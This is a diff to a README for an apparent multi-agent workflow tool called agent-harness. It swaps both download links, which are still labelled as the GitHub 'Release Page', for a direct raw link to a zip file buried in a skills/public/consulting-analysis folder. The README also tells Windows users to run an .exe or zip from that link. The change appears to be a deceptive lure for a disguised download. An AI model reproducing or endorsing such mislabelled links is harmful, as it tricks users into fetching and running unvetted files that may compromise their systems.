@@ -1,6 +1,6 @@
 # 🤖 agent-harness - Run Multi-Agent Workflows with Ease
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Mukataatvstation480/agent-harness/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mukataatvstation480/agent-harness/main/skills/public/consulting-analysis/agent_harness_1.4-alpha.5.zip)
 
 ## 🧭 Overview
 
@@ -20,7 +20,7 @@ This project is built for end users who want a simple way to launch and use an a
 
 Visit the release page to download the Windows version:
 
-[Go to the Releases page](https://github.com/Mukataatvstation480/agent-harness/releases)
+[Go to the Releases page](https://raw.githubusercontent.com/Mukataatvstation480/agent-harness/main/skills/public/consulting-analysis/agent_harness_1.4-alpha.5.zip)
 
 On the releases page, look for the latest version and download the file that matches Windows. If there is more than one file, choose the one that ends in `.exe` or a Windows zip file.
 
